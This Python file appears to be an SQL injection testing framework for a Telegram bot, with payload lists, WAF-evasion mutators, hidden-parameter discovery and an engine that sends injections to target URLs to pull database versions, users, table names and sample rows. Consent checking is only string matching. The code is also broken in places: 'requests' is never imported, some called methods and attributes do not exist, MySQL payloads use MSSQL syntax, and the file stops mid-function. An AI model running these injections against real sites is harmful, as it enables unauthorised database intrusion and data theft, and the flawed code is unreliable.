#!/usr/bin/env python3
"""
Comprehensive SQL Injection Testing Framework for Telegram Terminal Bot
Inspired by psqli-pro with advanced features and strict ethical controls
"""

import asyncio
import aiohttp
import sqlite3
import pymysql
import psycopg2
import hashlib
import hmac
import secrets
import json
import logging
import time
import re
import base64
import ipaddress
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple
from enum import Enum
from dataclasses import dataclass
from urllib.parse import urljoin, urlparse, parse_qs
import jwt
from cryptography.fernet import Fernet
import ssl
import socket
from contextlib import asynccontextmanager

logger = logging.getLogger(__name__)

class SQLiTestMode(Enum):
    DISABLED = "disabled"
    SAFE = "safe"           # Detection only, no exploitation
    LIMITED = "limited"     # Limited exploitation with safety controls
    FULL = "full"          # Full testing (admin only with consent)

class SQLiTechnique(Enum):
    ERROR_BASED = "error_based"
    UNION_BASED = "union_based"
    BOOLEAN_BASED = "boolean_based"
    TIME_BASED = "time_based"
    OUT_OF_BAND = "out_of_band"
    STACKED_QUERIES = "stacked_queries"

class DatabaseType(Enum):
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    SQLITE = "sqlite"
    ORACLE = "oracle"
    MSSQL = "mssql"
    MONGODB = "mongodb"

class RiskLevel(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

@dataclass
class SQLiPayload:
    payload_id: str
    technique: SQLiTechnique
    database_type: DatabaseType
    payload: str
    risk_level: RiskLevel
    description: str
    success_indicators: List[str]
    safe_mode: bool

@dataclass
class SQLiTestResult:
    test_id: str
    target_url: str
    parameter: str
    technique: SQLiTechnique
    vulnerable: bool
    confidence: float
    database_type: Optional[DatabaseType]
    extracted_data: Optional[Dict[str, Any]]
    error_messages: List[str]
    response_times: List[float]
    risk_assessment: RiskLevel
    ethical_notes: str

class EthicalSQLiManager:
    """Manager for ethical SQL injection testing with strict controls"""
    
    def __init__(self, mode: SQLiTestMode = SQLiTestMode.SAFE):
        self.mode = mode
        self.approved_targets = set()
        self.consent_records = {}
        self.test_history = []
        self.ip_whitelist = set()
        self.payload_database = self.initialize_payloads()
        self.waf_signatures = self.load_waf_signatures()
        self.ethical_guidelines = self.load_ethical_guidelines()
        self.encryption_key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.encryption_key)
        
    def load_ethical_guidelines(self) -> Dict[str, str]:
        """Load ethical guidelines for SQL injection testing"""
        return {
            'principle_1': 'Only test databases you own or have explicit written permission to test',
            'principle_2': 'Never test production databases without proper authorization',
            'principle_3': 'Always obtain signed consent before testing',
            'principle_4': 'Document all testing activities with timestamps',
            'principle_5': 'Never extract sensitive personal data',
            'principle_6': 'Report findings responsibly to appropriate parties',
            'principle_7': 'Follow responsible disclosure practices',
            'principle_8': 'Respect data privacy and confidentiality',
            'principle_9': 'Use minimum necessary force principle',
            'principle_10': 'Comply with all applicable laws and regulations'
        }
    
    def initialize_payloads(self) -> Dict[str, List[SQLiPayload]]:
        """Initialize comprehensive SQL injection payload database"""
        payloads = {
            'error_based': [
                SQLiPayload(
                    payload_id="error_mysql_1",
                    technique=SQLiTechnique.ERROR_BASED,
                    database_type=DatabaseType.MYSQL,
                    payload="'",
                    risk_level=RiskLevel.LOW,
                    description="Single quote error detection",
                    success_indicators=["mysql_fetch_array", "You have an error in your SQL syntax"],
                    safe_mode=True
                ),
                SQLiPayload(
                    payload_id="error_mysql_2",
                    technique=SQLiTechnique.ERROR_BASED,
                    database_type=DatabaseType.MYSQL,
                    payload="1' AND 1=CONVERT(int, (SELECT @@version))--",
                    risk_level=RiskLevel.MEDIUM,
                    description="MySQL version extraction via error",
                    success_indicators=["CONVERT", "@@version", "mysql"],
                    safe_mode=True
                ),
                SQLiPayload(
                    payload_id="error_postgres_1",
                    technique=SQLiTechnique.ERROR_BASED,
                    database_type=DatabaseType.POSTGRESQL,
                    payload="1' AND 1=CAST((SELECT version())::text as int)--",
                    risk_level=RiskLevel.MEDIUM,
                    description="PostgreSQL version extraction via error",
                    success_indicators=["CAST", "version()", "postgresql"],
                    safe_mode=True
                )
            ],
            'union_based': [
                SQLiPayload(
                    payload_id="union_mysql_1",
                    technique=SQLiTechnique.UNION_BASED,
                    database_type=DatabaseType.MYSQL,
                    payload="1' UNION SELECT 1,2,3--",
                    risk_level=RiskLevel.MEDIUM,
                    description="Basic UNION detection",
                    success_indicators=["UNION", "SELECT", "1,2,3"],
                    safe_mode=True
                ),
                SQLiPayload(
                    payload_id="union_mysql_2",
                    technique=SQLiTechnique.UNION_BASED,
                    database_type=DatabaseType.MYSQL,
                    payload="1' UNION SELECT null,null,null--",
                    risk_level=RiskLevel.MEDIUM,
                    description="UNION with null values",
                    success_indicators=["UNION", "null"],
                    safe_mode=True
                )
            ],
            'boolean_based': [
                SQLiPayload(
                    payload_id="boolean_mysql_1",
                    technique=SQLiTechnique.BOOLEAN_BASED,
                    database_type=DatabaseType.MYSQL,
                    payload="1' AND 1=1--",
                    risk_level=RiskLevel.LOW,
                    description="True condition detection",
                    success_indicators=["1=1", "AND"],
                    safe_mode=True
                ),
                SQLiPayload(
                    payload_id="boolean_mysql_2",
                    technique=SQLiTechnique.BOOLEAN_BASED,
                    database_type=DatabaseType.MYSQL,
                    payload="1' AND 1=2--",
                    risk_level=RiskLevel.LOW,
                    description="False condition detection",
                    success_indicators=["1=2", "AND"],
                    safe_mode=True
                )
            ],
            'time_based': [
                SQLiPayload(
                    payload_id="time_mysql_1",
                    technique=SQLiTechnique.TIME_BASED,
                    database_type=DatabaseType.MYSQL,
                    payload="1' AND SLEEP(0.1)--",
                    risk_level=RiskLevel.MEDIUM,
                    description="MySQL time-based detection",
                    success_indicators=["SLEEP", "time delay"],
                    safe_mode=True
                ),
                SQLiPayload(
                    payload_id="time_postgres_1",
                    technique=SQLiTechnique.TIME_BASED,
                    database_type=DatabaseType.POSTGRESQL,
                    payload="1' AND pg_sleep(0.1)--",
                    risk_level=RiskLevel.MEDIUM,
                    description="PostgreSQL time-based detection",
                    success_indicators=["pg_sleep", "time delay"],
                    safe_mode=True
                )
            ]
        }
        
        # Add advanced payloads for limited/full mode
        if self.mode in [SQLiTestMode.LIMITED, SQLiTestMode.FULL]:
            payloads['advanced'] = [
                SQLiPayload(
                    payload_id="advanced_union_1",
                    technique=SQLiTechnique.UNION_BASED,
                    database_type=DatabaseType.MYSQL,
                    payload="1' UNION SELECT table_name,null FROM information_schema.tables--",
                    risk_level=RiskLevel.HIGH,
                    description="Table name extraction via UNION",
                    success_indicators=["information_schema", "table_name"],
                    safe_mode=False
                ),
                SQLiPayload(
                    payload_id="advanced_error_1",
                    technique=SQLiTechnique.ERROR_BASED,
                    database_type=DatabaseType.MYSQL,
                    payload="1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    risk_level=RiskLevel.HIGH,
                    description="Database structure enumeration",
                    success_indicators=["information_schema", "COUNT"],
                    safe_mode=False
                )
            ]
        
        return payloads
    
    def load_waf_signatures(self) -> Dict[str, List[str]]:
        """Load Web Application Firewall evasion signatures"""
        return {
            'comment_bypass': ['/**/', '/*!--', '#', '--', ';--'],
            'encoding_bypass': ['%27', '%22', '0x27', '0x22', 'CHAR(39)', 'CHAR(34)'],
            'case_bypass': ['UnIoN', 'SeLeCt', 'aNd', 'Or'],
            'space_bypass': ['/**/', '/*!--*/', '()', '\t', '\n', '\r'],
            'concat_bypass': ['CONCAT', '||', 'CONCAT_WS', 'GROUP_CONCAT'],
            'null_bypass': ['0x00', '%00', '\x00', 'NULL']
        }
    
    def verify_ethical_authorization(self, user_id: str, target_url: str, 
                                    consent_document: str = None, 
                                    ip_address: str = None) -> Dict[str, Any]:
        """Verify ethical authorization before SQL injection testing"""
        try:
            # Check IP whitelist
            if ip_address and not self.is_ip_whitelisted(ip_address):
                return {
                    'authorized': False,
                    'reason': 'IP address not in whitelist',
                    'action': 'Contact administrator to add IP to whitelist'
                }
            
            # Verify target URL format
            if not self.is_valid_target_url(target_url):
                return {
                    'authorized': False,
                    'reason': 'Invalid target URL format',
                    'guidelines': self.ethical_guidelines
                }
            
            # Check if target is in approved list (for safe mode)
            if self.mode == SQLiTestMode.SAFE:
                if target_url not in self.approved_targets:
                    return {
                        'authorized': False,
                        'reason': 'Target not in approved list for safe mode',
                        'approved_targets': list(self.approved_targets),
                        'action': 'Request target approval from administrator'
                    }
            
            # Verify consent document (for limited/full modes)
            if self.mode in [SQLiTestMode.LIMITED, SQLiTestMode.FULL]:
                if not consent_document:
                    return {
                        'authorized': False,
                        'reason': 'Signed consent document required for this testing mode',
                        'guidelines': self.ethical_guidelines,
                        'action': 'Provide signed consent document'
                    }
                
                # Verify consent document signature (simplified)
                consent_hash = hashlib.sha256(consent_document.encode()).hexdigest()
                if not self.verify_consent_signature(consent_document):
                    return {
                        'authorized': False,
                        'reason': 'Consent document verification failed',
                        'action': 'Provide valid signed consent document'
                    }
                
                self.consent_records[user_id] = {
                    'target': target_url,
                    'consent_hash': consent_hash,
                    'timestamp': datetime.utcnow().isoformat(),
                    'ip_address': ip_address,
                    'mode': self.mode.value
                }
            
            return {
                'authorized': True,
                'verification_id': secrets.token_hex(16),
                'ethical_guidelines': self.ethical_guidelines,
                'mode': self.mode.value,
                'warnings': self.generate_ethical_warnings()
            }
            
        except Exception as e:
            logger.error(f"Error verifying ethical authorization: {e}")
            return {
                'authorized': False,
                'reason': f'Verification error: {str(e)}'
            }
    
    def is_ip_whitelisted(self, ip_address: str) -> bool:
        """Check if IP address is in whitelist"""
        try:
            ip = ipaddress.ip_address(ip_address)
            return str(ip) in self.ip_whitelist
        except ValueError:
            return False
    
    def is_valid_target_url(self, target_url: str) -> bool:
        """Validate target URL format and safety"""
        try:
            parsed = urlparse(target_url)
            
            # Check scheme
            if parsed.scheme not in ['http', 'https']:
                return False
            
            # Check for localhost/private IPs (require special approval)
            hostname = parsed.hostname
            if hostname:
                try:
                    ip = socket.gethostbyname(hostname)
                    if ipaddress.ip_address(ip).is_private:
                        return self.mode == SQLiTestMode.FULL  # Only full mode for private IPs
                except socket.gaierror:
                    pass
            
            return True
            
        except Exception:
            return False
    
    def verify_consent_signature(self, consent_document: str) -> bool:
        """Verify consent document signature (simplified implementation)"""
        try:
            # In production, this would verify digital signatures
            # For now, check document format and content
            required_elements = [
                'I hereby consent to security testing',
                'Target system:',
                'Testing scope:',
                'Date:',
                'Signature:',
                'System owner authorization:'
            ]
            
            return all(element in consent_document for element in required_elements)
            
        except Exception:
            return False
    
    def generate_ethical_warnings(self) -> List[str]:
        """Generate ethical usage warnings"""
        return [
            "⚠️ SECURITY TESTING IN PROGRESS - AUTHORIZED USE ONLY",
            "This tool is for authorized security testing only",
            "Ensure you have proper permission before testing",
            "Do not test production systems without approval",
            "Follow responsible disclosure practices",
            "Report findings to appropriate parties only"
        ]

class SQLiPayloadGenerator:
    """Automated SQL injection payload generation"""
    
    def __init__(self, waf_signatures: Dict[str, List[str]]):
        self.waf_signatures = waf_signatures
        self.base_payloads = self.generate_base_payloads()
        
    def generate_base_payloads(self) -> Dict[str, List[str]]:
        """Generate base payloads for different techniques"""
        return {
            'basic': [
                "'", '"', "`", "\\'", '\\"', "''", '""', "``",
                "1' OR '1'='1", "1\" OR \"1\"=\"1", "1` OR `1`=`1"
            ],
            'union': [
                "1' UNION SELECT 1--",
                "1' UNION SELECT 1,2--",
                "1' UNION SELECT 1,2,3--",
                "1' UNION SELECT null,null--"
            ],
            'boolean': [
                "1' AND 1=1--",
                "1' AND 1=2--",
                "1' OR 1=1--",
                "1' OR 1=2--"
            ],
            'time': [
                "1' AND SLEEP(0.1)--",
                "1' AND pg_sleep(0.1)--",
                "1' AND WAITFOR DELAY '0:0:0.1'--",
                "1' AND dbms_pipe.receive_message('RDS', 0.1)--"
            ]
        }
    
    def generate_waf_evasion_payloads(self, base_payload: str, technique: SQLiTechnique) -> List[str]:
        """Generate WAF evasion variants of payloads"""
        evasion_payloads = [base_payload]  # Original payload
        
        # Comment bypass techniques
        for comment in self.waf_signatures['comment_bypass']:
            evasion_payloads.append(base_payload.replace(' ', comment))
        
        # Encoding bypass techniques
        for encoding in self.waf_signatures['encoding_bypass']:
            if "'" in base_payload:
                evasion_payloads.append(base_payload.replace("'", encoding))
            elif '"' in base_payload:
                evasion_payloads.append(base_payload.replace('"', encoding))
        
        # Case variation bypass
        for case_var in self.waf_signatures['case_bypass']:
            if 'UNION' in base_payload.upper():
                evasion_payloads.append(base_payload.replace('UNION', case_var))
            elif 'SELECT' in base_payload.upper():
                evasion_payloads.append(base_payload.replace('SELECT', case_var))
        
        # Space bypass techniques
        for space_bypass in self.waf_signatures['space_bypass']:
            evasion_payloads.append(base_payload.replace(' ', space_bypass))
        
        return list(set(evasion_payloads))  # Remove duplicates
    
    def generate_database_specific_payloads(self, database_type: DatabaseType, technique: SQLiTechnique) -> List[str]:
        """Generate database-specific payloads"""
        db_payloads = []
        
        if database_type == DatabaseType.MYSQL:
            if technique == SQLiTechnique.ERROR_BASED:
                db_payloads.extend([
                    "1' AND 1=CONVERT(int, (SELECT @@version))--",
                    "1' AND 1=CONVERT(int, (SELECT user()))--",
                    "1' AND 1=CONVERT(int, (SELECT database()))--"
                ])
            elif technique == SQLiTechnique.UNION_BASED:
                db_payloads.extend([
                    "1' UNION SELECT table_name FROM information_schema.tables--",
                    "1' UNION SELECT column_name FROM information_schema.columns--"
                ])
            elif technique == SQLiTechnique.TIME_BASED:
                db_payloads.extend([
                    "1' AND SLEEP(0.1)--",
                    "1' AND BENCHMARK(1000000,MD5(1))--"
                ])
                
        elif database_type == DatabaseType.POSTGRESQL:
            if technique == SQLiTechnique.ERROR_BASED:
                db_payloads.extend([
                    "1' AND 1=CAST((SELECT version())::text as int)--",
                    "1' AND 1=CAST((SELECT current_user)::text as int)--"
                ])
            elif technique == SQLiTechnique.TIME_BASED:
                db_payloads.extend([
                    "1' AND pg_sleep(0.1)--",
                    "1' AND pg_sleep(0.2)--"
                ])
                
        elif database_type == DatabaseType.SQLITE:
            if technique == SQLiTechnique.ERROR_BASED:
                db_payloads.extend([
                    "1' AND 1=CAST(sqlite_version() as int)--",
                    "1' AND 1=CAST(typeof(1) as int)--"
                ])
            elif technique == SQLiTechnique.TIME_BASED:
                db_payloads.extend([
                    "1' AND LIKE('ABCDEFG', UPPER('abcdefg'))--"
                ])
        
        return db_payloads

class SQLiExploitationEngine:
    """SQL injection exploitation engine with safety controls"""
    
    def __init__(self, mode: SQLiTestMode):
        self.mode = mode
        self.extraction_limits = {
            SQLiTestMode.SAFE: 10,      # Max 10 records
            SQLiTestMode.LIMITED: 50,   # Max 50 records  
            SQLiTestMode.FULL: 100      # Max 100 records
        }
        self.sensitive_patterns = [
            r'\bpassword\b', r'\bpasswd\b', r'\bsecret\b',
            r'\bprivate_key\b', r'\bcredit_card\b', r'\bssn\b',
            r'\bsocial_security\b', r'\bdriver_license\b'
        ]
    
    def extract_database_info(self, vulnerable_url: str, parameter: str, 
                            technique: SQLiTechnique, database_type: DatabaseType) -> Dict[str, Any]:
        """Extract database information safely"""
        try:
            if self.mode == SQLiTestMode.SAFE:
                return self.safe_database_fingerprinting(vulnerable_url, parameter, technique, database_type)
            else:
                return self.limited_database_extraction(vulnerable_url, parameter, technique, database_type)
                
        except Exception as e:
            logger.error(f"Error extracting database info: {e}")
            return {'error': str(e), 'extracted': False}
    
    def safe_database_fingerprinting(self, vulnerable_url: str, parameter: str,
                                   technique: SQLiTechnique, database_type: DatabaseType) -> Dict[str, Any]:
        """Safe database fingerprinting without sensitive data extraction"""
        try:
            fingerprint_payloads = self.get_fingerprint_payloads(database_type, technique)
            
            database_info = {
                'database_type': database_type.value,
                'version': None,
                'user': None,
                'database_name': None,
                'tables_count': None,
                'extraction_method': 'safe_fingerprinting',
                'sensitive_data_extracted': False
            }
            
            for payload in fingerprint_payloads:
                # Test version extraction
                if 'version' in payload.lower():
                    version_result = self.test_payload_safety(vulnerable_url, parameter, payload)
                    if version_result.get('success', False):
                        database_info['version'] = version_result.get('extracted_data', 'Unknown')
                
                # Test user extraction (non-sensitive)
                if 'user' in payload.lower() and 'current_user' not in payload.lower():
                    user_result = self.test_payload_safety(vulnerable_url, parameter, payload)
                    if user_result.get('success', False):
                        database_info['user'] = user_result.get('extracted_data', 'Unknown')
                
                # Test database name extraction
                if 'database' in payload.lower() or 'schema' in payload.lower():
                    db_result = self.test_payload_safety(vulnerable_url, parameter, payload)
                    if db_result.get('success', False):
                        database_info['database_name'] = db_result.get('extracted_data', 'Unknown')
                
                # Test table count (non-sensitive)
                if 'count' in payload.lower() and 'table' in payload.lower():
                    count_result = self.test_payload_safety(vulnerable_url, parameter, payload)
                    if count_result.get('success', False):
                        database_info['tables_count'] = count_result.get('extracted_data', 'Unknown')
            
            return database_info
            
        except Exception as e:
            logger.error(f"Error in safe database fingerprinting: {e}")
            return {'error': str(e), 'extracted': False}
    
    def limited_database_extraction(self, vulnerable_url: str, parameter: str,
                                  technique: SQLiTechnique, database_type: DatabaseType) -> Dict[str, Any]:
        """Limited database extraction with safety controls"""
        try:
            extraction_payloads = self.get_extraction_payloads(database_type, technique)
            
            database_info = {
                'database_type': database_type.value,
                'version': None,
                'user': None,
                'database_name': None,
                'table_names': [],
                'column_names': [],
                'sample_data': [],
                'extraction_method': 'limited_extraction',
                'sensitive_data_extracted': False,
                'extraction_limit': self.extraction_limits[self.mode]
            }
            
            extracted_count = 0
            
            for payload in extraction_payloads:
                if extracted_count >= self.extraction_limits[self.mode]:
                    break
                
                # Extract version
                if 'version' in payload.lower():
                    version_data = self.extract_limited_data(vulnerable_url, parameter, payload, 'version')
                    if version_data:
                        database_info['version'] = version_data
                        extracted_count += 1
                
                # Extract user (non-sensitive)
                if 'current_user' in payload.lower() or 'user()' in payload.lower():
                    user_data = self.extract_limited_data(vulnerable_url, parameter, payload, 'user')
                    if user_data:
                        database_info['user'] = user_data
                        extracted_count += 1
                
                # Extract table names (limited)
                if 'table_name' in payload.lower():
                    tables_data = self.extract_table_names_limited(vulnerable_url, parameter, payload)
                    if tables_data:
                        database_info['table_names'] = tables_data
                        extracted_count += len(tables_data)
                
                # Extract sample data (non-sensitive only)
                if 'sample' in payload.lower():
                    sample_data = self.extract_sample_data_safe(vulnerable_url, parameter, payload)
                    if sample_data:
                        database_info['sample_data'] = sample_data
                        extracted_count += len(sample_data)
            
            return database_info
            
        except Exception as e:
            logger.error(f"Error in limited database extraction: {e}")
            return {'error': str(e), 'extracted': False}
    
    def extract_table_names_limited(self, vulnerable_url: str, parameter: str, payload: str) -> List[str]:
        """Extract table names with safety limits"""
        try:
            # Get system tables first (safe)
            system_tables_payload = payload.replace('table_name', 'table_name').replace(
                'FROM information_schema.tables',
                'FROM information_schema.tables WHERE table_schema NOT IN ("mysql", "information_schema", "performance_schema")'
            )
            
            result = self.execute_extraction_query(vulnerable_url, parameter, system_tables_payload)
            
            if result and 'data' in result:
                tables = result['data'][:10]  # Limit to 10 tables
                # Filter out sensitive table names
                safe_tables = [table for table in tables if not self.is_sensitive_table_name(table)]
                return safe_tables
            
            return []
            
        except Exception as e:
            logger.error(f"Error extracting table names: {e}")
            return []
    
    def extract_sample_data_safe(self, vulnerable_url: str, parameter: str, payload: str) -> List[Dict[str, str]]:
        """Extract sample data with safety filtering"""
        try:
            result = self.execute_extraction_query(vulnerable_url, parameter, payload)
            
            if result and 'data' in result:
                sample_data = []
                for row in result['data'][:5]:  # Limit to 5 rows
                    safe_row = self.filter_sensitive_data(row)
                    if safe_row:
                        sample_data.append(safe_row)
                return sample_data
            
            return []
            
        except Exception as e:
            logger.error(f"Error extracting sample data: {e}")
            return []
    
    def filter_sensitive_data(self, data: Any) -> Optional[Dict[str, str]]:
        """Filter sensitive data from extraction results"""
        try:
            if isinstance(data, dict):
                filtered_data = {}
                for key, value in data.items():
                    # Check if key or value contains sensitive patterns
                    if not self.contains_sensitive_pattern(str(key)) and not self.contains_sensitive_pattern(str(value)):
                        filtered_data[key] = str(value)[:100]  # Limit length
                return filtered_data if filtered_data else None
            
            elif isinstance(data, str):
                if not self.contains_sensitive_pattern(data):
                    return {'data': data[:100]}  # Limit length
                return None
            
            return None
            
        except Exception as e:
            logger.error(f"Error filtering sensitive data: {e}")
            return None
    
    def contains_sensitive_pattern(self, text: str) -> bool:
        """Check if text contains sensitive patterns"""
        try:
            for pattern in self.sensitive_patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    return True
            return False
            
        except Exception:
            return False
    
    def is_sensitive_table_name(self, table_name: str) -> bool:
        """Check if table name is sensitive"""
        sensitive_tables = [
            'users', 'passwords', 'secrets', 'private', 'admin',
            'credit_cards', 'ssn', 'social_security', 'drivers_license'
        ]
        return table_name.lower() in sensitive_tables
    
    def test_payload_safety(self, vulnerable_url: str, parameter: str, payload: str) -> Dict[str, Any]:
        """Test payload safely and return results"""
        try:
            test_url = self.build_test_url(vulnerable_url, parameter, payload)
            
            start_time = time.time()
            response = requests.get(test_url, timeout=10)
            end_time = time.time()
            
            response_time = end_time - start_time
            
            # Analyze response for success indicators
            success_indicators = self.analyze_response_for_success(response, payload)
            
            return {
                'success': len(success_indicators) > 0,
                'extracted_data': self.extract_data_from_response(response, payload),
                'response_time': response_time,
                'success_indicators': success_indicators,
                'response_length': len(response.text),
                'status_code': response.status_code
            }
            
        except requests.RequestException as e:
            return {
                'success': False,
                'error': str(e),
                'response_time': 0
            }
    
    def build_test_url(self, base_url: str, parameter: str, payload: str) -> str:
        """Build test URL with payload"""
        parsed_url = urlparse(base_url)
        query_params = parse_qs(parsed_url.query)
        
        # Replace or add parameter with payload
        query_params[parameter] = [payload]
        
        # Rebuild query string
        new_query = '&'.join([f"{k}={v[0]}" for k, v in query_params.items()])
        
        return f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
    
    def analyze_response_for_success(self, response: requests.Response, payload: str) -> List[str]:
        """Analyze response for SQL injection success indicators"""
        indicators = []
        
        # Check for database error messages
        error_patterns = [
            r'mysql_fetch_array', r'You have an error in your SQL syntax',
            r'PostgreSQL.*ERROR', r'Warning.*pg_',
            r'SQLite.*error', r'android\.database\.sqlite',
            r'Oracle.*ORA-', r'Microsoft.*OLE DB',
            r'DB2.*SQLCODE', r'Sybase.*Message'
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                indicators.append('database_error')
                break
        
        # Check for successful query execution signs
        success_patterns = [
            r'1=1', r'OR 1=1', r'UNION SELECT', r'information_schema',
            r'table_name', r'column_name', r'@@version', r'version()'
        ]
        
        for pattern in success_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                indicators.append('query_execution_signs')
                break
        
        # Check for content changes (boolean-based)
        if len(response.text) > 100:  # Significant content
            indicators.append('content_change')
        
        return indicators
    
    def extract_data_from_response(self, response: requests.Response, payload: str) -> Optional[str]:
        """Extract data from successful response"""
        try:
            # Look for common data patterns
            data_patterns = [
                r'version[:\s]+([0-9\.]+)',
                r'user[:\s]+([a-zA-Z0-9_]+)',
                r'database[:\s]+([a-zA-Z0-9_]+)',
                r'table_name[:\s]+([a-zA-Z0-9_]+)'
            ]
            
            for pattern in data_patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    return match.group(1)
            
            return None
            
        except Exception:
            return None
    
    def execute_extraction_query(self, vulnerable_url: str, parameter: str, query: str) -> Optional[Dict[str, Any]]:
        """Execute extraction query safely"""
        try:
            # Build extraction URL
            extraction_url = self.build_test_url(vulnerable_url, parameter, query)
            
            # Execute request
            response = requests.get(extraction_url, timeout=15)
            
            # Parse and return results
            return {
                'success': response.status_code == 200,
                'data': self.parse_extraction_results(response),
                'response_length': len(response.text)
            }
            
        except requests.RequestException as e:
            return {
                'success': False,
                'error': str(e)
            }
    
    def parse_extraction_results(self, response: requests.Response) -> List[str]:
        """Parse extraction results from response"""
        try:
            # Simple parsing - extract text between common delimiters
            results = []
            
            # Look for table-like data
            table_pattern = r'<td>([^<]+)</td>'
            matches = re.findall(table_pattern, response.text)
            if matches:
                results.extend(matches)
            
            # Look for comma-separated values
            csv_pattern = r'([^,]+),'
            matches = re.findall(csv_pattern, response.text)
            if matches:
                results.extend(matches)
            
            # Look for pipe-separated values
            pipe_pattern = r'([^|]+)\|'
            matches = re.findall(pipe_pattern, response.text)
            if matches:
                results.extend(matches)
            
            return [result.strip() for result in results if result.strip()]
            
        except Exception:
            return []

class SQLiTestingOrchestrator:
    """Main orchestrator for SQL injection testing"""
    
    def __init__(self, mode: SQLiTestMode = SQLiTestMode.SAFE):
        self.mode = mode
        self.ethical_manager = EthicalSQLiManager(mode)
        self.payload_generator = SQLiPayloadGenerator(self.ethical_manager.waf_signatures)
        self.exploitation_engine = SQLiExploitationEngine(mode)
        self.results_aggregator = SQLiResultsAggregator()
        self.dashboard_generator = SQLiDashboardGenerator()
        
    async def perform_comprehensive_sqli_test(self, target_url: str, user_id: str, 
                                            consent_document: str = None, 
                                            ip_address: str = None) -> Dict[str, Any]:
        """Perform comprehensive SQL injection testing"""
        try:
            # Verify ethical authorization
            auth_result = self.ethical_manager.verify_ethical_authorization(
                user_id, target_url, consent_document, ip_address
            )
            
            if not auth_result['authorized']:
                return {
                    'test_performed': False,
                    'reason': auth_result['reason'],
                    'ethical_guidelines': auth_result.get('ethical_guidelines', {})
                }
            
            # Discover parameters
            parameters = await self.discover_parameters(target_url)
            
            if not parameters:
                return {
                    'test_performed': False,
                    'reason': 'No parameters found for testing',
                    'discovered_endpoints': []
                }
            
            # Perform testing on each parameter
            test_results = []
            
            for parameter in parameters:
                param_results = await self.test_parameter_comprehensive(target_url, parameter, user_id)
                test_results.extend(param_results)
            
            # Generate comprehensive report
            comprehensive_report = self.generate_comprehensive_report(test_results, user_id)
            
            # Log ethical test
            self.ethical_manager.log_ethical_test(user_id, target_url, 'sqli_comprehensive', test_results)
            
            return comprehensive_report
            
        except Exception as e:
            logger.error(f"Error in comprehensive SQLi test: {e}")
            return {
                'test_performed': False,
                'error': str(e)
            }
    
    async def discover_parameters(self, target_url: str) -> List[str]:
        """Discover parameters in target URL"""
        try:
            parsed_url = urlparse(target_url)
            query_params = parse_qs(parsed_url.query)
            
            # Also discover forms and other parameter sources
            discovered_params = list(query_params.keys())
            
            # Try to discover hidden parameters
            hidden_params = await self.discover_hidden_parameters(target_url)
            discovered_params.extend(hidden_params)
            
            return list(set(discovered_params))  # Remove duplicates
            
        except Exception as e:
            logger.error(f"Error discovering parameters: {e}")
            return []
    
    async def discover_hidden_parameters(self, target_url: str) -> List[str]:
        """Discover hidden parameters through common parameter names"""
        try:
            common_params = [
                'id', 'user', 'uid', 'pid', 'product_id', 'item_id',
                'name', 'username', 'email', 'search', 'q', 'query',
                'page', 'limit', 'offset', 'sort', 'order', 'filter'
            ]
            
            discovered_hidden = []
            
            for param in common_params:
                test_url = self.build_test_url(target_url, param, "1")
                try:
                    response = requests.get(test_url, timeout=5)
                    # If response is different from base, parameter might exist
                    if response.status_code != 404 and len(response.text) > 100:
                        discovered_hidden.append(param)
                except:
                    continue
            
            return discovered_hidden
            
        except Exception as e:
            logger.error(f"Error discovering hidden parameters: {e}")
            return []
    
    async def test_parameter_comprehensive(self, target_url: str, parameter: str, user_id: str) -> List[Dict[str, Any]]:
        """Test single parameter with all techniques"""
        test_results = []
        
        # Test each technique
        for technique in SQLiTechnique:
            technique_results = await self.test_parameter_with_technique(target_url, parameter, technique, user_id)
            test_results.extend(technique_results)
        
        return test_results
    
    async def test_parameter_with_technique(self, target_url: str, parameter: str, 
                                          technique: SQLiTechnique, user_id: str) -> List[Dict[str, Any]]:
        """Test parameter with specific technique"""
        try:
            technique_results = []
            
            # Get payloads for this technique
            payloads = self.payload_generator.payload_database.get(technique.value, [])
            
            # Test each payload
            for payload in payloads:
                if self.mode == SQLiTestMode.SAFE and not payload.safe_mode:
                    continue
                
                result = await self.test_single_payload(target_url, parameter, payload, user_id)
                technique_results.append(result)
                
                # Stop if vulnerability confirmed (optimization)
                if result.vulnerable and result.confidence > 0.8:
                    break
            
            return technique_results
            
        except Exception as e:
            logger.error(f"Error testing parameter {parameter} with {technique.value}: {e}")
            return []
    
    async def test_single_payload(self, target_url: str, parameter: str, 
                                payload: SQLiPayload, user_id: str) -> SQLiTestResult:
        """Test single payload and return result"""
        try:
            # Build test URL with payload
            test_url = self.build_test_url(target_url, parameter, payload.payload)
            
            # Execute test with timing
            start_time = time.time()
            
            try:
                response = requests.get(test_url, timeout=10)
                end_time = time.time()
                response_time = end_time - start_time
                
                # Analyze response for vulnerability
                vulnerable, confidence, indicators = self.analyze_payload_response(response, payload)
                
                # Extract data if vulnerable and safe
                extracted_data = None
                if vulnerable and payload.safe_mode:
                    extracted_data = self.extract_safe_data(response, payload)
                
                # Determine database type
                database_type = self.fingerprint_database(response, payload)
                
                # Risk assessment
                risk_assessment = self.assess_risk_level(vulnerable, confidence, payload.risk_level)
                
                return SQLiTestResult(
                    test_id=secrets.token_hex(16),
                    target_url=target_url,
                    parameter=parameter,
                    technique=payload.technique,
                    vulnerable=vulnerable,
                    confidence=confidence,
                    database_type=database_type,
                    extracted_data=extracted_data,
                    error_messages=indicators,
                    response_times=[response_time],
                    risk_assessment=risk_assessment,
                    ethical_notes="Ethical testing performed with safety controls"
                )
                
            except requests.RequestException as e:
                return SQLiTestResult(
                    test_id=secrets.token_hex(16),
                    target_url=target_url,
                    parameter=parameter,
                    technique=payload.technique,
                    vulnerable=False,
                    confidence=0.0,
                    database_type=None,
                    extracted_data=None,
                    error_messages=[str(e)],
                    response_times=[0.0],
                    risk_assessment=RiskLevel.INFO,
                    ethical_notes=f"Request failed: {str(e)}"
                )
                
        except Exception as e:
            logger.error(f"Error testing single payload: {e}")
